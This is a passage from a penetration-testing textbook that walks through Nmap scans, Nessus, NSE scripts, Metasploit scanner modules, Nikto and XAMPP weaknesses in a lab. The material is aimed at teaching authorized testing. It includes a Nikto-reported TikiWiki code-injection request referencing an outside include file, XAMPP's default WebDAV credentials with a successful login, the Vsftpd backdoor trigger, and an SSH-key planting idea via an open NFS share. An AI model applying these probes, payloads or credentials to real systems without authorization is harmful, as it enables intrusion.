Linux; CPE: cpe:/o:linux:kernel\nNmap scan report for 192.168.20.12\nHost is up (0.0010s latency).\nNot shown: 999 filtered ports\n\nPORT STATE SERVICE VERSION\n80/tcp open http Microsoft IIS httpd 7.5\n135/tcp open msrpc Microsoft Windows RPC\nMAC Address: 00:0C:29:62:D5:C8 (VMware)\nService detection performed. Please report any incorrect results at http://nmap.org/submit/ .\nNmap done: 3 IP addresses (3 hosts up) scanned in 20.56 seconds\nListing 5-7: Running an Nmap version scan\nThis time we gained much more information about our Windows XP\nand Linux targets. For example, we knew there was an FTP server on the\nLinux box, but now we have reasonable assurance that the FTP server is Very\nSecure FTP version 2.3.4 u. We’ll use this output to search for potential vul-\nnerabilities in the next chapter. As for our Windows 7 system, we found out\nonly that it’s running Microsoft IIS 7.5, a fairly up-to-date version. It’s possible\nto install IIS 8 on Windows 7, but it’s not officially supported. The version\nitself would not raise any red flags to me. We will find that the application\ninstalled on this IIS server is the real issue in Chapter 14.\nnote Keep in mind that Nmap may report the wrong version in some cases (for instance,\nif the software has been updated, but the welcome banner is not edited as part of the\npatch), but at the very least, its version scan gave us a good place to begin further\nresearch.\nUDP Scans\nBoth Nmap’s SYN and version scans are TCP scans that do not query UDP\nports. Because UDP is connectionless, the scanning logic is a bit different.\n128 Chapter 5\nIn a UDP scan (-sU), Nmap sends a UDP packet to a port. Depending on\nthe port, the packet sent is protocol specific. If it receives a response, the\nport is considered open. If the port is closed, Nmap will receive an ICMP\nPort Unreachable message. If Nmap receives no response whatsoever, then\neither the port is open and the program listening does not respond to\nNmap’s query, or the traffic is being filtered. Thus, Nmap is not always able\nto distinguish between an open UDP port and one that is filtered by a fire-\nwall. See Listing 5-8 for a UDP scan example.\nroot@kali:~# nmap -sU 192.168.20.10-12 -oA bookudp\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 08:39 EST\nStats: 0:11:43 elapsed; 0 hosts completed (3 up), 3 undergoing UDP Scan\nUDP Scan Timing: About 89.42% done; ETC: 08:52 (0:01:23 remaining)\nNmap scan report for 192.168.20.10\nHost is up (0.00027s latency).\nNot shown: 990 closed ports\n\nPORT STATE SERVICE\n69/udp open|filtered tftp u\n123/udp open ntp\n135/udp open msrpc\n137/udp open netbios-ns\n138/udp open|filtered netbios-dgm\n445/udp open|filtered microsoft-ds\n500/udp open|filtered isakmp\n1026/udp open win-rpc\n1065/udp open|filtered syscomlan\n1900/udp open|filtered upnp\nMAC Address: 00:0C:29:A5:C1:24 (VMware)\nNmap scan report for 192.168.20.11\nHost is up (0.00031s latency).\nNot shown: 994 closed ports\n\nPORT STATE SERVICE\n68/udp open|filtered dhcpc\n111/udp open rpcbind\n137/udp open netbios-ns\n138/udp open|filtered netbios-dgm\n2049/udp open nfs v\n5353/udp open zeroconf\nMAC Address: 00:0C:29:FD:0E:40 (VMware)\nNmap scan report for 192.168.20.12\nHost is up (0.072s latency).\nNot shown: 999 open|filtered ports\n\nPORT STATE SERVICE\n137/udp open netbios-ns\nMAC Address: 00:0C:29:62:D5:C8 (VMware)\nNmap done: 3 IP addresses (3 hosts up) scanned in 1073.86 seconds\nListing 5-8: Running a UDP scan\nInformation Gathering 129\nFor example, on the Windows XP system, the TFTP port (UDP 69) may\nbe open or filtered u. On the Linux target, Nmap was able to glean that\nthe Network File System port is listening v. Because only two TCP ports\nresponded on the Windows 7 box, it’s fair to assume that a firewall is in\nplace, in this case the built-in Windows firewall. Likewise, the Windows fire-\nwall is filtering all traffic except to one UDP port. (If the Windows firewall\nwere not in place, our UDP scan might give us more information.)\nScanning a Specific Port\nBy default, Nmap scans only the 1,000 ports it considers the most “interest-\ning,” not the 65,535 possible TCP or UDP ports. The default Nmap scan will\ncatch common running services, but in some cases it will miss a listening port\nor two. To scan specific ports, use the -p flag with Nmap. For example, to\nscan port 3232 on the Windows XP target, see Listing 5-9.\nroot@Kali:~# nmap -sS -p 3232 192.168.20.10\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 09:03 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00031s latency).\n\nPORT STATE SERVICE\n3232/tcp open unknown\nMAC Address: 00:0C:29:A5:C1:24 (VMware)\nListing 5-9: Running an Nmap scan on a specific port\nSure enough, when we tell Nmap to scan 3232, it returns open, which\nshows that this port is worth checking out, in addition to the default Nmap\nscanned ports. However, if we try to probe the port a bit more aggressively\nwith a version scan (see Listing 5-10), the service listening on the port\ncrashes, as shown in Figure 5-8.\nnote A good rule of thumb is to specify ports 1 through 65535 on your pentests, just to\nmake sure there’s nothing listening on those other “uninteresting” ports.\nroot@kali:~# nmap -p 3232 -sV 192.168.20.10\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-04-28 10:19 EDT\nNmap scan report for 192.168.20.10\nHost is up (0.00031s latency).\n\nPORT STATE SERVICE VERSION\n3232/tcp open unknown\n1 service unrecognized despite returning datau. If you know the service/\nversion, please submit the following fingerprint at http://www.insecure.org/\ncgi-bin/servicefp-submit.cgi : v\nSF-Port3232-TCP:V=6.25%I=7%D=4/28%Time=517D2FFC%P=i686-pc-linux-gnu%r(GetR\nSF:equest,B8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Zervit\\x200\\.4\\r\\nwX-Pow\n130 Chapter 5\nSF:ered-By:\\x20Carbono\\r\\nConnection:\\x20close\\r\\nAccept-Ranges:\\x20bytes\\\nSF:r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\x2036\\r\\n\\r\\n<html>\\r\\\nSF:n<body>\\r\\nhi\\r\\n</body>\\r\\n</html>\");\nMAC Address: 00:0C:29:13:FA:E3 (VMware)\nListing 5-10: Running a version scan against a specific port\nFigure 5-8: The Zervit server crashes when scanned by Nmap. In the process of crashing the listening service, Nmap can’t figure out\nwhat software is running as noted at u, but it does manage to get a finger-\nprint of the service. Based on the HTML tags in the fingerprint at v, this\nservice appears to be a web server. According to the Server: field, it is some-\nthing called Zervit 0.4 w. At this point, we have crashed the service, and we may never see it\nagain on our pentest, so any potential vulnerabilities may be a moot point. Of course, in our lab we can just switch over to our Windows XP target and\nrestart the Zervit server. note Though hopefully you won’t make any services crash on your pentests, there is always\na possibility that you will run into a particularly sensitive service that was not coded\nto accept anything other than expected input, such that even seemingly benign traffic\nlike an Nmap scan causes it to crash. SCADA systems are particularly notorious for\nthis sort of behavior. You always want to explain this to your client. When working\nwith computers, there are no guarantees. We’ll return to the Nmap tool in the next chapter when we use the\nNmap Scripting Engine (NSE) to learn detailed vulnerability information\nabout our target systems before beginning exploitation. Information Gathering 131\nsummary\nIn this chapter we’ve managed to cover a lot of ground very quickly just by\nusing publicly available sources and port scanners. We used tools such as\ntheHarvester and Maltego to scour the Internet for information such as\nemail addresses and websites. We used the Nmap port scanner to find out\nwhich ports are listening on our target virtual machines. Based on the\noutput we’ve discovered, we can now do some research on known vulner-\nabilities as we start to think like attackers and actively seek exploitable vul-\nnerabilities in the systems. In the next chapter, we’ll cover the vulnerability\nanalysis phase of penetration testing. 132 Chapter 5\n6\nfinDing Vulner aBilities\nBefore we start slinging exploits, we need to do some\nmore research and analysis. When identifying vulner-\nabilities, we actively search for issues that will lead to\ncompromise in the exploitation phase. Although some\nsecurity firms will just run an automated exploitation tool and hope for the\nbest, careful study of the vulnerabilities by a skilled pentester will garner\nbetter results than any tool on its own. We’ll examine several vulnerability analysis methods in this chapter,\nincluding automated scanning, targeted analysis, and manual research. From nmap Version scan to Potential Vulnerability\nNow that we have some information about our target and the attack sur-\nface, we can develop scenarios to reach our pentest goals. For example, the\nFTP server on port 21 announced itself as Vsftpd 2.3.4. Vsftpd is short for\nVery Secure FTP. We might assume that a product that calls itself very secure is asking for\ntrouble, and in fact, in July 2011, it came to light that the Vsftpd repository\nhad been breached. The Vsftpd binaries had been replaced with a back-\ndoored version that could be triggered with a username containing a smiley\nface :). This opens a root shell on port 6200. Once the issue was discovered,\nthe backdoored binaries were removed, and the official Vsftpd 2.3.4 was put\nback in place. So, though the presence of Vsftpd 2.3.4 doesn’t guarantee that\nour target is vulnerable, it is definitely a threat to consider. Pentesting doesn’t\nget much easier than piggybacking on an attacker who already owns a system. nessus\nTenable Security’s Nessus is one of the most widely used commercial vul-\nnerability scanners, though many vendors provide comparable products. Nessus shares its name with a centaur who was slain by the Greek mytho-\nlogical hero, Heracles, and whose blood later killed Heracles himself. The\nNessus database includes vulnerabilities across platforms and protocols,\nand its scanner performs a series of checks to detect known issues. You’ll\nfind entire books and training courses devoted to Nessus, and as you become\nmore familiar with the tool, you’ll find what works best for you. I’ll provide\nonly a high-level discussion of Nessus here. Nessus is available as a paid professional version that pentesters and in-\nhouse security teams can use to scan networks for vulnerabilities. You can\nuse the free, noncommercial version called Nessus Home to try the exer-\ncises in this book. Nessus Home is limited to scanning 16 IP addresses. (Nessus isn’t preinstalled on Kali, but we covered installing it in Chapter 1.)\nBefore you can run Nessus you need to start the Nessus daemon. To do\nso, enter the service command as shown here to start the Nessus web inter-\nface on TCP port 8834. root@kali:~# service nessusd start\nNow open a web browser, and access Nessus by directing the Iceweasel\nbrowser to https://kali:8834. (If you want to access the Nessus interface\nfrom another system, such as the host, you must replace kali with the IP\naddress of the Kali machine.) After a few minutes of initialization, you\nshould see a login screen, shown in Figure 6-1. Use the login credentials\nyou created in Chapter 1. Nessus Policies\nThe Nessus web interface has several tabs at the top of the screen, as shown\nin Figure 6-2. Let’s start with the Policies tab. Nessus policies are like con-\nfiguration files that tell Nessus which vulnerability checks, port scanners, and\nso on to run in the vulnerability scan. 134 Chapter 6\nFigure 6-1: The Nessus web interface login screen\nFigure 6-2: Nessus policies\nTo create a policy, click New Policy at the left of the Nessus interface. Nessus’s policy wizards will help you create a policy that will be useful\nfor your scanning goals, as shown in Figure 6-3. For our simple example,\nchoose Basic Network Scan. Finding Vulnerabilities 135\nFigure 6-3: Nessus policy wizards\nNow you are prompted for some basic information about the policy, as\nshown in Figure 6-4, including a name, a description, and whether other\nNessus users can access the policy. Once you are done, click Next. Figure 6-4: Basic policy setup\nNow you are asked if this is an internal or external scan, as shown in\nFigure 6-5. Choose Internal and click Next. 136 Chapter 6\nFigure 6-5: Internal or external scan\nIf you have credentials, Nessus can authenticate with hosts and look for\nvulnerabilities that may not be apparent from a network-facing perspective. This feature is often used by internal security teams to test the security\nposture of their networks. You can set these credentials in the next step, as\nshown in Figure 6-6. For now, you can leave this step blank and click Save. Figure 6-6: Adding credentials (optional)\nAs shown in Figure 6-7, our new policy is now shown in the Policy tab. Finding Vulnerabilities 137\nFigure 6-7: Our policy is added. Scanning with Nessus\nNow, let’s switch to the Scans tab and run Nessus against our target\nmachines. Click Scans4New Scan, and fill in the scan information,\nas shown in Figure 6-8. Nessus needs to know the name for our scan\n(Name), which scan policy to use (Policy), and which systems to scan\n(Targets). Figure 6-8: Starting a Nessus scan\n138 Chapter 6\nNessus runs a series of probes against the target in an attempt to detect\nor rule out as many issues as possible. The running scan is added to the Scans\ntab as shown in Figure 6-9. Figure 6-9: Running a Nessus scan\nOnce the scan is finished, click it to view the results, as shown in\nFigure 6-10. Figure 6-10: High-level overview of the results\nAs shown in the figure, Nessus found several critical vulnerabilities on\nthe Windows XP and Ubuntu targets. But it found only informational data\non the Windows 7 box. To see details of a specific host, click it. Details of the Windows XP\nvulnerabilities are shown in Figure 6-11. Finding Vulnerabilities 139\nFigure 6-11: Nessus categorizes and describes its results. Say what you want about vulnerability scanners, but it’s hard to find a\nproduct that can tell you as much about a target environment as quickly\nand with as little effort as Nessus. For example, Nessus’s results reveal that\nour Windows XP target is in fact missing the MS08-067 patch discussed in\nChapter 4. It also seems to be missing other Microsoft patches affecting the\nSMB server. Which vulnerability is the most exploitable? The Nessus output for a\nparticular issue will often give you some information about that issue’s poten-\ntial exploitability. For example, clicking the MS08-067 vulnerability in the\noutput (Figure 6-12) shows exploit code available for this vulnerability in\nMetasploit as well as other tools such as Core Impact and Canvas. Figure 6-12: The MS08-067 Nessus entry provides detailed information. A Note About Nessus Rankings\nNessus ranks vulnerabilities based on the Common Vulnerability Scoring\nSystem (CVSS), version 2, from the National Institute of Standards and\n140 Chapter 6\nTechnology (NIST). Ranking is calculated based on the impact to the sys-\ntem if the issue is exploited. Though the higher the vulnerability ranking,\nthe more serious Nessus thinks the vulnerability issue is, the actual risk of\na vulnerability depends on the environment. For example, Nessus ranks\nanonymous FTP access as a medium-risk vulnerability. When restricted to\nnonsensitive files, however, anonymous FTP access can have a low to non-\nexistent risk. On the other hand, it isn’t unheard of for companies to leave\ncopies of their proprietary source code lying around on a publicly available\nFTP server. If on an external pentesting engagement you can access the cli-\nent’s biggest asset by logging in as anonymous on an FTP server, it’s safe to\nassume that any interested attacker can do the same, and this warrants an\nimmediate call to your client contact. Tools are not capable of making this\nsort of distinction. For that you need a pentester. Why Use Vulnerability Scanners? Though some penetration testing courses leave out vulnerability scanning\naltogether and argue that a skilled pentester can find everything a scanner\ncan, scanners are still valuable tools, especially because many pentests are\nperformed within a shorter time window than anyone might like. But if one\nof the goals of your assessment is to avoid detection, you might think twice\nabout using a loud vulnerability scanner. Though Nessus did not find every issue in our environment, its use,\ncombined with the results of our information-gathering phase, has given\nus a solid starting point for exploitation. Even those pentesters who think\nthat a pentester should replace a scanner during an engagement can ben-\nefit from knowing how to use scanning tools. Though in an ideal world,\nevery company would perform regular, no-holds-barred pentests, in reality,\nthere is plenty of vulnerability scanning work to go around. Exporting Nessus Results\nOnce a Nessus scan finishes, you can export its findings from the Export\nbutton at the top of the scan details screen, as shown in Figure 6-13. Figure 6-13: Exporting Nessus scan results\nFinding Vulnerabilities 141\nNessus can output results into PDF, HTML, XML, CSV, and other for-\nmats. You may want to hand off the raw results to your client for a vulner-\nability scanning engagement, but you should never export scanner results,\nslap your company letterhead on them, and call them pentest results. Much\nmore analysis is involved in a penetration test than a vulnerability scan. You\nshould always verify results from automated scanners and combine them\nwith manual analysis to get a more complete picture of the vulnerabilities\nin the environment. Now for a look at some other methods of vulnerability analysis. Researching Vulnerabilities\nIf the Nessus summary page doesn’t give you enough information about a\nvulnerability, try a good old-fashioned Google search.\n\nAdditionally, try\nsearching http://www.securityfocus.com/, http://www .packetstormsecurity.org/,\nhttp://www.exploit-db.org/, and http://www.cve.mitre .org/. For example, you can\nsearch for vulnerabilities using the Common Vulnerabilities and Exposures\n(CVE) system, Microsoft patch number, and so on within a specific site using\na Google query such as “ms08-067 site:securityfocus.com”. The MS08-067 vul-\nnerability received a lot of attention, so you’ll find no shortage of good infor-\nmation. (We looked at the details of this particular issue in Chapter 4.)\nDepending on your subject vulnerability, you may be able to find proof-\nof-concept exploit code online as well. We’ll look at working with public code\nin Chapter 19, but be warned that unlike the community-vetted exploits in a\nproject such as Metasploit, not all code on the Internet does what it claims. The payload in a public exploit may destroy the target machine, or it may\njoin your machine to the exploit author’s secret botnet. Be vigilant when\nworking with public exploits, and carefully vet them before running them\nagainst a production network. (You may also be able to find in-depth infor-\nmation about some vulnerabilities posted by the researchers who originally\nfound the issue.)\nthe nmap scripting engine\nNow for another tool that provides vulnerability scanning. Just as Metasploit\nevolved from an exploitation framework into a fully fledged penetration-\ntesting suite with hundreds of modules, Nmap has similarly evolved beyond\nits original goal of port scanning. The Nmap Scripting Engine (NSE) lets\nyou run publicly available scripts and write your own. You’ll find the scripts packaged with the NSE in Kali at /usr/share/nmap\n/scripts. The available scripts fall into several categories, including informa-\ntion gathering, active vulnerability assessment, searches for signs of previ-\nous compromises, and so on. Listing 6-1 shows NSE scripts available in your\ndefault Kali installation. root@kali:~# cd /usr/share/nmap/scripts\nroot@kali:/usr/local/share/nmap/scripts# ls\nacarsd-info.nse ip-geolocation-geobytes.nse\n142 Chapter 6\naddress-info.nse ip-geolocation-geoplugin.nse\nafp-brute.nse ip-geolocation-ipinfodb.nse\nafp-ls.nse ip-geolocation-maxmind.nse\n--snip--\nListing 6-1: Nmap scripts list\nTo get more information about a particular script or category of scripts,\nenter the --script-help flag in Nmap. For example, to see all scripts in the\ndefault category enter nmap --script-help default, as shown in Listing 6-2. Many factors contribute to whether a script is included in the default cate-\ngory, including its reliability and whether the script is safe and unlikely to\nharm the target. root@kali:~# nmap --script-help default\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:43 EDT\n--snip--\nftp-anon\nCategories: default auth safe\nhttp://nmap.org/nsedoc/scripts/ftp-anon.html\nChecks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and\nhighlights writeable files. --snip--\nListing 6-2: Nmap default scripts help\nIf you use the -sC flag to tell Nmap to run a script scan in addition to\nport scanning, it will run all the scripts in the default category, as shown in\nListing 6-3. root@kali:~# nmap -sC 192.168.20.10-12\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-30 20:21 EST\nNmap scan report for 192.168.20.10\nHost is up (0.00038s latency). Not shown: 988 closed ports\n\nPORT STATE SERVICE\n21/tcp open ftp\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxr-xr-x 1 ftp ftp 0 Aug 06 2009 incoming\n|_-r--r--r-- 1 ftp ftp 187 Aug 06 2009 onefile.html\n|_ftp-bounce: bounce working!\n25/tcp open smtp\n| smtp-commands: georgia.com, SIZE 100000000, SEND, SOML, SAML, HELP, VRFYu, EXPN, ETRN, XTRN,\n|_ This server supports the following commands. HELO MAIL RCPT DATA RSET SEND SOML SAML HELP\n\nNOOP QUIT\n79/tcp open finger\n|_finger: Finger online user list request denied.\n80/tcp open http\n|_http-methods: No Allow or Public header in OPTIONS response (status code 302)\nFinding Vulnerabilities 143\n| http-title: XAMPP 1.7.2 v\n|_Requested resource was http://192.168.20.10/xampp/splash.php\n--snip--\n3306/tcp open mysql\n| mysql-info: MySQL Error detected!\n| Error Code was: 1130\n|_Host '192.168.20.9' is not allowed to connect to this MySQL server w\n--snip--\nListing 6-3: Nmap default scripts output\nAs you can see, the Nmap Scripting Engine found a good deal of inter-\nesting information. For example, we see that the SMTP server on port 25\nof the Windows XP target allows the use of the VRFY u command, which\nallows us to see if a username exists on the mail server. If we have a valid\nusername, use of this command will make credential-guessing attacks much\nmore likely to succeed.\nWe can also see that the web server on port 80 appears to be an XAMPP\n\n1.7.2 install v. As of this writing, the current stable version of XAMPP for\nWindows is 1.8.3. At the very least, the version we found is out of date, and\nit may also be subject to security issues.\nIn addition to showing us potential vulnerabilities, NSE also allows us\nto rule out some services. For example, we can see that the MySQL server\non port 3306 does not allow us to connect because our IP address is not\nauthorized w. We may want to return to this port during post exploitation\nif we are able to compromise other hosts in the environment, but for now\nwe can rule out MySQL vulnerabilities on this host.\nrunning a single nse script\nBefore we move on, let’s look at another example of using an NSE script, this\ntime one that is not part of the default set. From our basic use of Nmap in\nthe previous chapter, we know that our Linux target is running Network File\nSystem (NFS). NFS allows client computers to access local files over the net-\nwork, but in your pentesting career, you may find that setting up NFS securely\nis easier said than done. Many users don’t think about the security conse-\nquences of giving remote users access to their files. What’s the worst that can\nhappen, right? Who cares if I share my home directory with my coworkers?\nThe NSE script nfs-ls.nse will connect to NFS and audit shares. We can\nsee more information about an individual script with the --script-help com-\nmand, as shown in Listing 6-4.\nroot@kali:~# nmap --script-help nfs-ls\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-07-16 14:49 EDT\nnfs-ls\nCategories: discovery safe\n144 Chapter 6\nhttp://nmap.org/nsedoc/scripts/nfs-ls.html\nAttempts to get useful information about files from NFS exports.\nThe output is intended to resemble the output of <code>ls</code>.\n--snip--\nListing 6-4: Nmap NFS-LS script details\nThis script mounts the remote shares, audits their permissions, and\nlists the files included in the share. To run a script against our Linux tar-\nget, we call it using the --script option and the script name, as shown in\nListing 6-5.\nroot@kali:/# nmap --script=nfs-ls 192.168.20.11\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-12-28 22:02 EST\nNmap scan report for 192.168.20.11\nHost is up (0.00040s latency).\nNot shown: 993 closed ports\n\nPORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 2.3.4\n22/tcp open ssh OpenSSH 5.1p1 Debian 3ubuntu1 (Ubuntu Linux; protocol 2.0)\n80/tcp open http Apache httpd 2.2.9 ((Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch)\n111/tcp open rpcbind 2 (RPC #100000)\n| nfs-ls:\n| Arguments:\n| maxfiles: 10 (file listing output limited)\n|\n| NFS Export: /export/georgiau\n| NFS Access: Read Lookup Modify Extend Delete NoExecute\n| PERMISSION UID GID SIZE MODIFICATION TIME FILENAME\n| drwxr-xr-x 1000 1000 4096 2013-12-28 23:35 /export/georgia\n| -rw------- 1000 1000 117 2013-12-26 03:41 .Xauthority\n| -rw------- 1000 1000 3645 2013-12-28 21:54 .bash_history\n| drwxr-xr-x 1000 1000 4096 2013-10-27 03:11 .cache\n| -rw------- 1000 1000 16 2013-10-27 03:11 .esd_auth\n| drwx------ 1000 1000 4096 2013-10-27 03:11 .gnupg\n| ?????????? ? ? ? ? .gvfs\n| -rw------- 1000 1000 864 2013-12-15 19:03 .recently-used.xbel\n| drwx------ 1000 1000 4096 2013-12-15 23:38 .sshv\n--snip--\nListing 6-5: Nmap NFS-LS scripts output\nAs you can see, the NSE script found the NFS share /export/georgia u on\nour Linux target. Of particular interest is the .ssh directory v, which may\ninclude sensitive information such as SSH keys and (if public key authenti-\ncation is allowed on the SSH server) a list of authorized keys. When you run into an access-control mistake like this, one common pen-\ntest trick is to use the mistake and the write permission to add a new SSH\nFinding Vulnerabilities 145\nkey to the authorized_keys list (in this case, ours). If that attempt succeeds,\nsuddenly the seemingly minor issue of being able to edit a user’s documents\nturns into the ability to log in to the remote system and execute commands. Before we move on, let’s ensure that public key SSH authentication is\nenabled on our Linux target, allowing the attack we envisioned above to\nwork successfully. Key-based login is considered the strongest form of SSH\nauthentication and is recommended for security. A quick SSH attempt to\nour Linux target shows that public key authentication is allowed here u\n(see Listing 6-6). root@kali:/# ssh 192.168.20.11\nThe authenticity of host '192.168.20.11 (192.168.20.11)' can't be established. RSA key fingerprint is ab:d7:b0:df:21:ab:5c:24:8b:92:fe:b2:4f:ef:9c:21. Are you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.20.11' (RSA) to the list of known hosts. root@192.168.20.11's password:\nPermission denied (publickeyu,password). Listing 6-6: SSH authentication methods\nnote Some NSE scripts may crash services or harm the target system, and an entire category\nis dedicated to denial of service. For example, the script smb-check-vulns will check\nfor the MS08-067 vulnerability and other SMB vulnerabilities. Its help information\nnotes that this script is likely dangerous and shouldn’t be run on production systems\nunless you are prepared for the server to go down. metasploit scanner modules\nMetasploit, which we used in Chapter 4, also can conduct vulnerability\nscanning via numerous auxiliary modules. Unlike exploits, these modules\nwill not give us control of the target machine, but they will help us identify\nvulnerabilities for later exploitation. One such Metasploit module looks for FTP services that provide anony-\nmous access. Although it may be easy enough to attempt to log in manually\nto individual FTP servers, Metasploit auxiliary modules let us scan many\nhosts at once, which will save time when you’re testing a large environment. To choose a particular module, we use the module, then we define\nour targets with set, and then scan with the exploit command, as shown\nin Listing 6-7. This syntax should be familiar from Chapter 4. msf > use scanner/ftp/anonymous\nmsf auxiliary(anonymous) > set RHOSTS 192.168.20.10-11\nRHOSTS => 192.168.20.10-11\nmsf auxiliary(anonymous) > exploit\n[*] 192.168.20.10:21 Anonymous READ (220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de) u\n220 Please visit http://sourceforge.net/projects/filezilla/)\n146 Chapter 6\n[*] Scanned 1 of 2 hosts (050% complete)\n[*] 192.168.20.11:21 Anonymous READ (220 (vsFTPd 2.3.4)) u\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(anonymous) >\nListing 6-7: Metasploit anonymous FTP scanner module\nAt u, we find that both the Windows XP and Linux targets have anony-\nmous FTP enabled. We know this may or may not be a serious issue, based\non the files that are available to the anonymous user in the FTP folder. I’ve been on engagements where company trade secrets were sitting on an\nInternet-facing FTP server. On the other hand, I’ve also been on engage-\nments where the use of anonymous FTP was justified from a business per-\nspective, and no sensitive files were present. It is up to a pentester to fill in\nthe information an automated scanner lacks as to the severity of an issue in\na particular environment. metasploit exploit Check Functions\nSome Metasploit exploits include a check function that connects to a target\nto see if it is vulnerable, rather than attempting to exploit a vulnerability. We can use this command as a kind of ad hoc vulnerability scan, as shown\nin Listing 6-8. (There’s no need to specify a payload when running check\nbecause no exploitation will take place.)\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set RHOST 192.168.20.10\nRHOST => 192.168.20.10\nmsf exploit(ms08_067_netapi) > checku\n[*] Verifying vulnerable status... (path: 0x0000005a)\n[+] The target is vulnerable.v\nmsf exploit(ms08_067_netapi) >\nListing 6-8: MS08-067 check function\nWhen we run the vulnerability check u, Metasploit tells us that our\nWindows XP target is vulnerable to the MS08-067 vulnerability v, as\nexpected. Unfortunately, not all Metasploit modules have check functions. (If you\ntry running check on a module that doesn’t support it, Metasploit will tell\nyou.) For example, based on the results of our Nmap version scan in the\nprevious chapter, the Windows XP target mail server appears to be out of\ndate and subject to security issues. SLMail version 5.5.0.4433 has a known\nexploitable issue—CVE-2003-0264—so we can find it easily with a quick\nsearch in Msfconsole for cve:2003-0264. Finding Vulnerabilities 147\nOnce in the context of the module, we can test out check, as shown in\nListing 6-9. msf exploit(seattlelab_pass) > set RHOST 192.168.20.10\nrhost => 192.168.20.10\nmsf exploit(seattlelab_pass) > check\n[*] This exploit does not support check. msf exploit(seattlelab_pass) >\nListing 6-9: The SLMail module has no check function. As it turns out, this exploit module does not implement the check func-\ntion, so we don’t have solid assurance that a service is vulnerable. Although\nour SLMail POP3 server appears to be vulnerable based on its banner version\nnumber, we can’t get confirmation from Metasploit. In cases like these, we\nmay not be able to know for sure if a vulnerability exists short of running an\nexploit. web application scanning\nAlthough a client’s custom-built apps may have security problems, your tar-\nget may also deploy prebuilt web applications such as payroll apps, webmail,\nand so on, which can be vulnerable to the same issues. If we can find an\ninstance of known vulnerable software, we may be able to exploit it to get\na foothold in a remote system. Web application issues are particularly interesting on many external\npenetration tests where your attack surface may be limited to little more\nthan web servers. For example, as you can see in Figure 6-14, browsing to\nthe default web page of the web server on our Linux target reveals a default\nApache install page. Figure 6-14: Default Apache page\n148 Chapter 6\nUnless we can find a vulnerability in the underlying web server soft-\nware, we’ll have a hard time exploiting a simple page that reads “It works!”\nBefore we write this service off, though, let’s use a web scanner to look for\nadditional pages that we might not see otherwise. Nikto\nNikto is a web application vulnerability scanner built into Kali that’s like\nNessus for web apps: It looks for issues such as dangerous files, outdated\nversions, and misconfigurations. To run Nikto against our Linux target,\nwe tell it which host to scan with the -h flag, as shown in Listing 6-10. root@kali:/# nikto -h 192.168.20.11\n- Nikto v2.1.5\n---------------------------------------------------------------------------\n+ Target IP: 192.168.20.11\n+ Target Hostname: 192.168.20.11\n+ Target Port: 80\n+ Start Time: 2015-12-28 21:31:38 (GMT-5)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch\n--snip--\n+ OSVDB-40478: /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x. tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a\nvulnerability which allows remote attackers to execute arbitrary PHP code. u\n+ 6474 items checked: 2 error(s) and 7 item(s) reported on remote host\n+ End Time: 2015-12-28 21:32:41 (GMT-5) (63 seconds)\nListing 6-10: Running Nikto\nManually browsing to the default installation path for every application\nwith known vulnerabilities would be a daunting task, but fortunately, Nikto\nseeks out URLs that may not be apparent. One particularly interesting find-\ning here is a vulnerable installation of the TikiWiki software u on the server. Sure enough, if we browse to the TikiWiki directory at http://192.168.20.11/\ntikiwiki/, we find the CMS software. Nikto thinks that this install is subject\nto a code execution vulnerability, and further analysis of Open Sourced\nVulnerability Database (OSVDB) entry 40478 reveals that this issue has a\nMetasploit exploit that we can use during exploitation. note OSVDB (http://osvdb.com/) is a vulnerability repository specifically for open source\nsoftware such as TikiWiki, with detailed information on a wide variety of products.\n\nUse it to search for additional information about possible issues you find. Attacking XAMPP\nBrowsing to our Windows XP web server, we see at http://192.168.20.10/ that\nthe default web page announces itself as XAMPP 1.7.2. By default, XAMPP installations include phpMyAdmin, a database\nadministration web application. Ideally, phpMyAdmin would not be available\nFinding Vulnerabilities 149\nover the network, or at least it should require credentials to access it. But\non this version of XAMPP, the phpMyAdmin install at http://192.168.20.10\n/phpmyadmin/ is available and open. Even worse, phpMyAdmin gives us root\naccess on the same MySQL server that NSE told us we are unable to con-\nnect to. Using phpMyAdmin (as shown in Figure 6-15), we can bypass this\nrestriction and perform MySQL queries on the server. Figure 6-15: The open phpMyAdmin console complains quite loudly about the poor\nconfiguration. Default Credentials\nIn addition to its inclusion of phpMyAdmin, a Google search tells us\nthat XAMPP 1.7.3 and earlier come with Web Distributed Authoring and\nVersioning (WebDAV) software, which is used to manage files on a web\nserver over HTTP. XAMPP’s WebDAV installation comes with the default\nusername and password wampp:xampp. If these values aren’t changed, any-\none with access to WebDAV can log in, deface the website, and even pos-\nsibly upload scripts that will allow attackers to get a foothold on the system\nthrough the web server. And, as you can see in Figure 6-16, WebDAV is\nindeed present on this server. Figure 6-16: WebDAV install\nWe can use the tool Cadaver to interact with WebDAV servers. In\nListing 6-11, we use Cadaver to try to connect to the WebDAV server at\nhttp://192.168.20.10 and test the default credential set. 150 Chapter 6\nroot@kali:/# cadaver http://192.168.20.10/webdav\nAuthentication required for XAMPP with WebDAV on server `192.168.20.10':\nUsername: wampp\nPassword:\ndav:/webdav/> u\nListing 6-11: Using Cadaver\nThe Cadaver login is successful u. Our Windows XP target uses 